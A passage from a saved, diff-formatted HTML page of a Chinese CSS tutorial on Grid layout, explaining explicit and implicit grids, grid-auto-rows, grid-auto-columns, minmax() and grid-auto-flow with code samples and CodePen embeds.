+</code></pre>
+
+<div style="margin-bottom: 20px">
+<iframe height="700" style="width: 100%;" scrolling="no" title="Sizing implicit tracks with grid-auto-columns/rows" src="./Grid布局：6-显式网格和隐式网格_files/dyvpLNV(1).html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href='https://codepen.io/airen/pen/dyvpLNV'>Sizing implicit tracks with grid-auto-columns/rows</a> by Airen
+  (<a rel="nofollow" href='https://codepen.io/airen'>@airen</a>) on <a rel="nofollow" href='https://codepen.io'>CodePen</a>.
+</iframe>
+</div>
+
+<p>从浏览器渲染出来的结果不难发现，重复了一次<code>grid-auto-columns</code> 的<code>100px auto</code>值：</p>
+
+<pre class="css"><code class="css"><span class="class"><span class="class">.container</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-auto-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">100</span></span>px auto;</span></span></span><span class="value"></span></span> 
+    <span class="rule"><span class="rule">// 等同于
+    <span class="attribute"><span class="attribute">grid-auto-columns</span></span>:<span class="value"><span class="value"> <span class="number"><span class="number">100</span></span>px auto <span class="number"><span class="number">100</span></span>px auto;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<div style="margin-bottom: 20px">
+<video controls="" width="100%" style="width: 100%; aspect-ratio: 16 / 9;" poster="/sites/default/files/blogs/2021/2105/css-grid-131.jpg">
+    <source src="/sites/default/files/blogs/2021/2105/css-grid-131.mp4" type="video/mp4">
+</video>
+</div>
+
+<p>使用浏览器网格审查器，可以看到效果如下：</p>
+
+<p><img src="./Grid布局：6-显式网格和隐式网格_files/css-grid-132.jpg" alt=""></p>
+
+<p>这一点非常有意思，我原以为额外创建出来的隐式网格轨道尺寸是 <code>auto</code>，结果并不是，而是重复了已显式设置的值。</p>
+
+<p>上面给大家演示的是 <strong>隐式网格轨道被添加到显式网格的末端（列网格轨道和行网格轨道末端）</strong>，其实隐式网格轨道还可能被扩展到显式网格的起点。比如下面这个示例：</p>
+
+<pre class="css"><code class="css"><span class="class"><span class="class">.grid__container</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> grid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">repeat(<span class="number"><span class="number">2</span></span>, <span class="number"><span class="number">200</span></span>px)</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-rows</span></span></span><span class="rule">:<span class="value"><span class="value"> max-content;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-auto-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">100</span></span>px auto;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-auto-rows</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">60</span></span>px auto;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">gap</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">10</span></span>px;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__item</span></span><span class="pseudo"><span class="pseudo">:nth-child(1)</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-column</span></span></span><span class="rule">:<span class="value"><span class="value"> -<span class="number"><span class="number">5</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__item</span></span><span class="pseudo"><span class="pseudo">:nth-child(2)</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-row</span></span></span><span class="rule">:<span class="value"><span class="value"> -<span class="number"><span class="number">3</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-column</span></span></span><span class="rule">:<span class="value"><span class="value"> span <span class="number"><span class="number">2</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__item</span></span><span class="pseudo"><span class="pseudo">:nth-child(3)</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-area</span></span></span><span class="rule">:<span class="value"><span class="value"> -<span class="number"><span class="number">3</span></span> / -<span class="number"><span class="number">5</span></span> / <span class="number"><span class="number">1</span></span> / <span class="number"><span class="number">1</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__item</span></span><span class="pseudo"><span class="pseudo">:nth-child(4)</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-column</span></span></span><span class="rule">:<span class="value"><span class="value"> span <span class="number"><span class="number">2</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<div style="margin-bottom: 20px">
+<iframe height="700" style="width: 100%;" scrolling="no" title="Extending the grid to the start" src="./Grid布局：6-显式网格和隐式网格_files/wvJzbVJ(1).html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href='https://codepen.io/airen/pen/wvJzbVJ'>Extending the grid to the start</a> by Airen
+  (<a rel="nofollow" href='https://codepen.io/airen'>@airen</a>) on <a rel="nofollow" href='https://codepen.io'>CodePen</a>.
+</iframe>
+</div>
+
+<p>在这个例子中，除了第四个网格项目之外的其他网格项目，通过 <code>grid-column</code>、<code>grid-row</code> 或 <code>grid-area</code> 结合负值网格线放置在未显式创建的网格轨道中，从而在显式网格起点创建了隐式网格：</p>
+
+<p><img src="./Grid布局：6-显式网格和隐式网格_files/css-grid-133.jpg" alt=""></p>
+
+<p>除了上面提到的之外还有更多，更复杂的放置网格项目的方式，也有可能创建隐式网格（比如下图，图中所示为黑色虚线是显式网格，红色虚线是隐式网格）：</p>
+
+<p><img src="./Grid布局：6-显式网格和隐式网格_files/css-grid-134.jpg" alt=""></p>
+
+<p><code>grid-auto-rows</code> 和 <code>grid-auto-columns</code> 两个属性可以让我们控制隐式网格轨道尺寸：</p>
+
+<pre class="css"><code class="css"><span class="class"><span class="class">.container</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> grid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">repeat(<span class="number"><span class="number">4</span></span>, <span class="number"><span class="number">1</span></span>fr)</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-rows</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">100</span></span>px <span class="number"><span class="number">100</span></span>px;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-gap</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">20</span></span>px;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-auto-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">200</span></span>px;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-auto-rows</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">60</span></span>px;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__item</span></span><span class="pseudo"><span class="pseudo">:nth-child(1)</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-column-start</span></span></span><span class="rule">:<span class="value"><span class="value"> -<span class="number"><span class="number">1</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__item</span></span><span class="pseudo"><span class="pseudo">:nth-child(2)</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-row-start</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">4</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<p>上面代码定义了隐式网格轨道中的列网格轨道宽是<code>200px</code>，行网格轨道高是<code>60px</code>，而且不管网格项目是否合适：</p>
+
+<div style="margin-bottom: 20px">
+<iframe height="600" style="width: 100%;" scrolling="no" title="Sizing implicit tracks" src="./Grid布局：6-显式网格和隐式网格_files/VwpmMoo(1).html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href='https://codepen.io/airen/pen/VwpmMoo'>Sizing implicit tracks</a> by Airen
+  (<a rel="nofollow" href='https://codepen.io/airen'>@airen</a>) on <a rel="nofollow" href='https://codepen.io'>CodePen</a>.
+</iframe>
+</div>
+
+<p><img src="./Grid布局：6-显式网格和隐式网格_files/css-grid-135.jpg" alt=""></p>
+
+<p>你还可以通过使用 <code>minmax()</code> 函数给隐式网格轨道尺寸指定一个范围，使网格轨道尺寸设置更加灵活：</p>
+
+<pre class="css"><code class="css"><span class="class"><span class="class">.container</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-auto-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">minmax(<span class="number"><span class="number">200</span></span>px, auto)</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-auto-rows</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">minmax(<span class="number"><span class="number">60</span></span>px, auto)</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<p>隐式网格轨道现在列宽至少有 <code>200px</code>，行高有 <code>60px</code>，但如果内容需要，会扩大。</p>
+
+<p>从上面这些示例中，不难发现，使用<code>grid-auto-rows</code> 和 <code>grid-auto-columns</code> 可以指定网格轨道大小，所以没有必要定义一个显式网格：</p>
+
+<pre class="css"><code class="css"><span class="class"><span class="class">.grid__container</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> grid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-auto-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">minmax(<span class="number"><span class="number">100</span></span>px, auto)</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-auto-rows</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">minmax(<span class="number"><span class="number">100</span></span>px, auto)</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">gap</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">10</span></span>px;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__item</span></span><span class="pseudo"><span class="pseudo">:nth-child(1)</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-column</span></span></span><span class="rule">:<span class="value"><span class="value"> -<span class="number"><span class="number">5</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__item</span></span><span class="pseudo"><span class="pseudo">:nth-child(2)</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-row</span></span></span><span class="rule">:<span class="value"><span class="value"> -<span class="number"><span class="number">3</span></span> / span <span class="number"><span class="number">2</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-column</span></span></span><span class="rule">:<span class="value"><span class="value"> span <span class="number"><span class="number">2</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__item</span></span><span class="pseudo"><span class="pseudo">:nth-child(3)</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-area</span></span></span><span class="rule">:<span class="value"><span class="value"> -<span class="number"><span class="number">3</span></span> / -<span class="number"><span class="number">5</span></span> / <span class="number"><span class="number">1</span></span> / -<span class="number"><span class="number">2</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__item</span></span><span class="pseudo"><span class="pseudo">:nth-child(4)</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-column</span></span></span><span class="rule">:<span class="value"><span class="value"> span <span class="number"><span class="number">2</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__item</span></span><span class="pseudo"><span class="pseudo">:nth-child(5)</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-column</span></span></span><span class="rule">:<span class="value"><span class="value"> span <span class="number"><span class="number">2</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<div style="margin-bottom: 20px">
+<iframe height="660" style="width: 100%;" scrolling="no" title="Not defining an explicit grid" src="./Grid布局：6-显式网格和隐式网格_files/GRWNONq(1).html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href='https://codepen.io/airen/pen/GRWNONq'>Not defining an explicit grid</a> by Airen
+  (<a rel="nofollow" href='https://codepen.io/airen'>@airen</a>) on <a rel="nofollow" href='https://codepen.io'>CodePen</a>.
+</iframe>
+</div>
+
+<p>仅仅依靠隐式网格与显式放置网格项目相结合会变得混乱笔难以理解。</p>
+
+<p><img src="./Grid布局：6-显式网格和隐式网格_files/css-grid-136.jpg" alt=""></p>
+
+<p>但要注意，如果网格容器仅使用 <code>grid-auto-rows</code> 和 <code>grid-auto-columns</code> 定义隐式网格轨道尺寸大小，并未显式使用 <code>grid-row</code>、<code>grid-column</code> 和 <code>grid-area</code> 显式放置网格项目，此时仅会创建一个一列多行的网格：</p>
+
+<pre class="css"><code class="css"><span class="class"><span class="class">.container</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> grid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-auto-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">minmax(<span class="number"><span class="number">100</span></span>px, auto)</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-auto-rows</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">minmax(<span class="number"><span class="number">100</span></span>px, auto)</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">gap</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">10</span></span>px;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<p>上面这个示例，创建了一个 <code>1 x 5</code> 的网格：</p>
+
+<p><img src="./Grid布局：6-显式网格和隐式网格_files/css-grid-137.jpg" alt=""></p>
+
+<p>通过这些示例，不难发现在网格布局中，<code>grid-auto-rows</code> 和 <code>grid-auto-columns</code> 显式设置隐式网格轨道尺寸 与 <code>grid-template-rows</code> 和 <code>grid-template-columns</code> 显式设置显式网格轨道尺寸非常相似：</p>
+
+<div style="margin-bottom: 20px">
+<iframe height="700" style="width: 100%;" scrolling="no" title="Not defining an explicit grid" src="./Grid布局：6-显式网格和隐式网格_files/GRWNOev(1).html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href='https://codepen.io/airen/pen/GRWNOev'>Not defining an explicit grid</a> by Airen
+  (<a rel="nofollow" href='https://codepen.io/airen'>@airen</a>) on <a rel="nofollow" href='https://codepen.io'>CodePen</a>.
+</iframe>
+</div>
+
+<p>但并不是所有的都相似，比如 <code>repeat()</code> 函数就不能用于 <code>grid-auto-rows</code> 和 <code>grid-auto-columns</code>：</p>
+
+<p><img src="./Grid布局：6-显式网格和隐式网格_files/css-grid-138.jpg" alt=""></p>
+
+<p>不过，即使<code>grid-auto-columns</code>和<code>grid-auto-rows</code>显式设置的值无效也不会影响布局，因为浏览器将会重置值为<code>auto</code>。</p>
+
+<p><img src="./Grid布局：6-显式网格和隐式网格_files/css-grid-139.jpg" alt=""></p>
+
+<p>更有意思的是，我们在网格容器中不显式地设置<code>grid-auto-rows</code>、<code>grid-auto-columns</code>，也不显式设置<code>grid-template-rows</code>、<code>grid-template-columns</code> 和 <code>grid-template-areas</code>，只是在网格项目上显式使用 <code>grid-row</code>、<code>grid-column</code> 和 <code>grid-area</code> 放置网格项目，也能创建隐式网格：</p>
+
+<pre class="css"><code class="css"><span class="class"><span class="class">.grid__container</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> grid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">gap</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">10</span></span>px;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__item</span></span><span class="pseudo"><span class="pseudo">:nth-child(1)</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-column</span></span></span><span class="rule">:<span class="value"><span class="value"> -<span class="number"><span class="number">5</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__item</span></span><span class="pseudo"><span class="pseudo">:nth-child(2)</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-row</span></span></span><span class="rule">:<span class="value"><span class="value"> -<span class="number"><span class="number">3</span></span> / span <span class="number"><span class="number">2</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-column</span></span></span><span class="rule">:<span class="value"><span class="value"> span <span class="number"><span class="number">2</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__item</span></span><span class="pseudo"><span class="pseudo">:nth-child(3)</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-area</span></span></span><span class="rule">:<span class="value"><span class="value"> -<span class="number"><span class="number">3</span></span> / -<span class="number"><span class="number">5</span></span> / <span class="number"><span class="number">1</span></span> / -<span class="number"><span class="number">2</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__item</span></span><span class="pseudo"><span class="pseudo">:nth-child(4)</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-column</span></span></span><span class="rule">:<span class="value"><span class="value"> span <span class="number"><span class="number">2</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__item</span></span><span class="pseudo"><span class="pseudo">:nth-child(5)</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-column</span></span></span><span class="rule">:<span class="value"><span class="value"> span <span class="number"><span class="number">2</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<div style="margin-bottom: 20px">
+<iframe height="700" style="width: 100%;" scrolling="no" title="Not defining an explicit grid" src="./Grid布局：6-显式网格和隐式网格_files/ZEeBvRb(1).html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href='https://codepen.io/airen/pen/ZEeBvRb'>Not defining an explicit grid</a> by Airen
+  (<a rel="nofollow" href='https://codepen.io/airen'>@airen</a>) on <a rel="nofollow" href='https://codepen.io'>CodePen</a>.
+</iframe>
+</div>
+
+<p>使用浏览器网格审查器，你将会发现，上面这个示例中默认创建了一个 <code>1 x 1</code> 的显式网格，且因多个网格项目放置不同的位置，创建了一个隐式的网格，即最终创建了一个 <code>5 x 3</code> 网格（五列三行网格）：</p>
+
+<p><img src="./Grid布局：6-显式网格和隐式网格_files/css-grid-140.jpg" alt=""></p>
+
+<p>前面提到过，当 <code>grid-template-columns</code> 定义的显式网格无法放置所有网格项目的时候，网格项目会自动放置，比如：</p>
+
+<pre class="css"><code class="css"><span class="class"><span class="class">.grid__container</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> grid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">repeat(<span class="number"><span class="number">2</span></span>, <span class="number"><span class="number">100</span></span>px)</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">gap</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">10</span></span>px;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<p><img src="./Grid布局：6-显式网格和隐式网格_files/css-grid-141.jpg" alt=""></p>
+
+<p>不过，如果显式在网格容器上显式设置 <code>grid-auto-flow</code>属性值：</p>
+
+<pre class="css"><code class="css"><span class="class"><span class="class">.grid__container</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> grid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">repeat(<span class="number"><span class="number">2</span></span>, <span class="number"><span class="number">100</span></span>px)</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">--grid-auto-flow</span></span></span><span class="rule">:<span class="value"><span class="value"> row;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-auto-flow</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">var(--grid-auto-flow)</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">gap</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">10</span></span>px;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<div style="margin-bottom: 20px">
+<iframe height="500" style="width: 100%;" scrolling="no" title="Implicit Grid with grid-auto-flow" src="./Grid布局：6-显式网格和隐式网格_files/ExWNQPw(1).html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href='https://codepen.io/airen/pen/ExWNQPw'>Implicit Grid with grid-auto-flow</a> by Airen
+  (<a rel="nofollow" href='https://codepen.io/airen'>@airen</a>) on <a rel="nofollow" href='https://codepen.io'>CodePen</a>.
+</iframe>
+</div>
+
+<p>当<code>grid-auto-flow</code>的值为 <code>column</code> 或 <code>column dense</code>时，指定自动布局算法通过逐列填充来排列元素，在必要时增加新列。也就是说，<code>grid-auto-flow</code> 属性控制没有明确位置的网格项目的自动放置，一旦显式网格被填满（或者没有显式网格），自动放置也会引起隐式网格轨道的生成，即创建了隐式网格：</p>
+
+<p><img src="./Grid布局：6-显式网格和隐式网格_files/css-grid-142.jpg" alt=""></p>
+
+<p>换句话说，在 CSS 网格中，网格容器的 <code>grid-template-rows</code>、<code>grid-template-columns</code> 和 <code>grid-template-areas</code> 属性定义了显式网格的固定数量的网格轨道。当网格项目被定位在这些界限之外时，网格容器会通过向网格添加隐式网格线来生成隐式网格轨道。这些网格线与显式网格线一起构建成了隐式网格。另外，网格容器的 <code>grid-auto-rows</code> 和 <code>grid-auto-columns</code> 属性对这些隐式网格轨道以及由 <code>grid-template-areas</code> 创建但未被 <code>grid-template-rows</code> 或 <code>grid-template-columns</code> 明确调整大小的任何显式网格轨道进行调整。同时，网格容器的 <code>grid-auto-flow</code> 属性控制没有明确位置的网格项目的自动放置。一旦显式网格被填满（或没有显式网格），自动放置也会创建隐式网格。或者可以这样来理解：</p>
+
+<ul>
+<li><code>grid-template-rows</code>、<code>grid-template-columns</code> 和 <code>grid-template-areas</code> 定义显式网格</li>
+<li><code>grid-template-rows</code> 和 <code>grid-template-columns</code> 可以用来指定显式网格网格轨道固定数量和网格轨道尺寸</li>
+<li><code>grid-auto-rows</code>、<code>grid-auto-columns</code> 和 <code>grid-auto-flow</code> 定义隐式网格</li>
+<li><code>grid-auto-rows</code> 和 <code>grid-auto-columns</code> 可以用来指定隐式网格网格轨道尺寸</li>
+<li><code>grid-row</code>、<code>grid-column</code> 和 <code>grid-area</code> 将网格项目放置在显式网格之外也将会创建隐式网格，即使未使用 <code>grid-template-rows</code>、<code>grid-template-columns</code> 和 <code>grid-template-areas</code> 也能创建隐式网格</li>
+</ul>
+
+<p>虽然在介绍隐式网格时多次提到 <code>grid-auto-flow</code> 和网格项目自动放置，但并未详细介绍。然而，网格项目自动放置或者说网格容器的<code>grid-auto-flow</code> 在网格布局中也是非常重要的一个技术点。<code>grid-auto-flow</code> 属性可以控制网格项目自动布局算法怎么运作，能精确指定在网格中被自动放置的网格项目是怎样排列的。</p>
+
+<p>嗯，接下来，我们将和大家探讨网格布局中的网格项目自动放置。</p>
+</div></div></div>  </div>
+
+  
+   
+    <div id="node_footer" class="clearfix">
+              <div class="previous-next"><span class="prev">上一篇: </span><a href="https://www.w3cplus.com/css/grid-layout-part-5.html" target="_blank">图解CSS: Grid布局（Part5）</a> | <span class="next">下一篇: </span><a href="https://www.w3cplus.com/css/what-is-new-css-in-2021.html" target="_blank">2021年你可能不知道的 CSS 特性</a></div>            
+    </div>
+
+        
+
+</div>  </div>
+</div>
+  </div>
+
+        </div>
+
+      </div>
+    </div>
+
+    
+          <div id="sidebar-second" class="col-extra" style="position: sticky; top: 80px;">
+        <!-- <script type="text/javascript">document.write(unescape('%3Cdiv id="bdcs"%3E%3C/div%3E%3Cscript charset="utf-8" src="//rp.baidu.com/rp3w/3w.js?sid=10994702955876242907') + '&t=' + (Math.ceil(new Date()/3600000)) + unescape('"%3E%3C/script%3E'));</script> -->
+          <div class="region region-sidebar-second">
+    <div id="block-custom-search-blocks-1" class="block block-custom-search-blocks">
+
+    
+  <div class="content">
+    <form class="search-form" role="search" action="https://www.w3cplus.com/css/grid-layout-part-6.html?expire=1699848490&amp;code=0i-_V80maLg&amp;sign=bb8336ce2ffce6a5c7994526f8ccf5a7" method="post" id="custom-search-blocks-form-1" accept-charset="UTF-8" target="_self"><div><div class="form-item form-type-textfield form-item-custom-search-blocks-form-1">
+  <label class="element-invisible" for="edit-custom-search-blocks-form-1--2">Search this site </label>
+ <input title="请输入您想搜索的关键词。" class="custom-search-box form-text" placeholder="" type="text" id="edit-custom-search-blocks-form-1--2" name="custom_search_blocks_form_1" value="" size="15" maxlength="128">
+</div>
+<input type="hidden" name="delta" value="1">
+<input type="hidden" name="form_build_id" value="form-rTj-_VdvY1rz8cke4Em7UHzGdjopPm5TOWI3ckX8xGI">
+<input type="hidden" name="form_id" value="custom_search_blocks_form_1">
+<div class="form-actions form-wrapper" id="edit-actions"><input type="submit" id="edit-submit" name="op" value="搜索" class="form-submit"></div></div></form>  </div>
+</div>
+<div id="block-block-53" class="block block-block">
+
+    <h2>直达目的地(^_^)</h2>
+  
+  <div class="content">
